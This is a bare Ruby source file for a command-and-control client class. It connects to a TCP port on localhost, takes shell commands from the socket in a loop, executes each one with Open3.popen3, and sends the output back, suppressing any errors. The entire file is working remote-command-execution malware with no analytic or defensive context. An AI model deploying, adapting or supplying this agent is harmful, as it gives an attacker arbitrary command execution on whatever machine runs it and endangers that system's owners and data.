class C2Client
  def initialize
    require 'socket'
    require 'open3'
  end

  def get_command
    loop do
      command = @client_socket.gets
      execute_command(command)
    end
  end

  def execute_command(command)
    begin
      stdin, stdout, stderr = Open3.popen3(command)
      result = stdout.read

      @client_socket.puts(result)
    rescue => e
      exit(0)
    end
  end

  def main
    begin
      @client_socket = TCPSocket.new('localhost', 9091)
      get_command
    rescue

    end
  end
end

client = C2Client.new()
client.main()
